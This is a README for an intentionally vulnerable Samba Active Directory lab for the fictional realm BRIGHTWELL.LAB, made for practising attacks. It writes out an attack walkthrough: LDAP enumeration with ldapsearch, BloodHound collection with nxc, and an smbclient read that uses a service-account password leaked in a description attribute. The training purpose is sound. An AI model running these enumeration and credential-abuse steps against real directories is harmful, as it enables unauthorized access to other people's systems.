# LDAP / BloodHound Enumeration (Active Directory)

A single-container Active Directory lab built with [Isoloom](https://www.isoloom.com):
[`isoloom.yml`](isoloom.yml) describes one Samba Domain Controller for the realm
**BRIGHTWELL.LAB** (Brightwell University) — no Windows VMs. It provisions a low-privilege
foothold user (`s.adeyemi`, a student), a service account (`svc-moodle`, the Moodle LMS sync
account) whose LDAP `description` leaks its own password, a nested group chain
(`svc-moodle` → **IT-Staff** → **Registry-Admins**), and a `registry` share only
**Registry-Admins** may read.

| Machine | Service |
| --- | --- |
| dc | Samba AD DC: DNS 53, Kerberos 88, LDAP 389/636, SMB 445, kpasswd 464, GC 3268 |

## The attack

1. From `s.adeyemi` / `Student!2024`, bind over a plain LDAP simple bind and enumerate the directory:
   `ldapsearch -x -H ldap://<dc> -D 's.adeyemi@brightwell.lab' -w 'Student!2024' -b 'DC=brightwell,DC=lab' '(objectClass=user)' sAMAccountName description memberOf`
   → `svc-moodle` carries its own password in its `description` attribute.
2. Map the group paths (`nxc ldap <dc> -u s.adeyemi -p 'Student!2024' --bloodhound --collection All`,
   or follow `memberOf` by hand): `svc-moodle` → **IT-Staff** → **Registry-Admins**.
3. The `registry` share is restricted to **Registry-Admins**.
4. Read the flag: `smbclient //dc/registry -U 'BRIGHTWELL\svc-moodle%<leaked>' -c 'get flag.txt'`.

`s.adeyemi` is in none of those groups, so the flag is reachable only after the enumeration reveals
both the leaked credential and the nested group path.

## Run it

```bash
isoloom generate
isothrum up . --target docker
isothrum check . --target docker
isothrum down . --target docker
```

The same spec also runs on a local VM, a cloud VM, or Kubernetes targets that Isoloom supports.
This environment is deliberately vulnerable: keep it isolated.
